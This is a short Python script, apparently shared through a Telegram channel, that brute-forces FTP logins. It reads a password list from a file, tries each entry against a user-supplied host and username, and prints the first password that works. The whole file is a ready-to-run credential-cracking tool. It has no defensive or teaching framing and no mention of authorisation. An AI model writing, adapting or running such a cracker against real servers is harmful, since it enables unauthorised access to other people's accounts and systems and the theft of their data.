# by : https://t.me/name_dark
import ftplib

def crack_password():
    try:
       
        hostname = input("Enter FTP hostname: ")
        username = input("Enter username: ")
        password_file = input("Enter the path to the password file: ")

        password_list = open(password_file, "r")
        for password in password_list.readlines():
            password = password.strip('\n')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                ftp.quit()
                print(f"User Name FTP: \033[1;32m{username}")
                print(f"\033[1;37mSuccessful login! FTP password is: \033[1;32m{password}")
                break
            except Exception as e:
                
                continue
    except Exception as e:
        
        print(f"Failed to open password file or missing information. Error: {str(e)}")

crack_password()

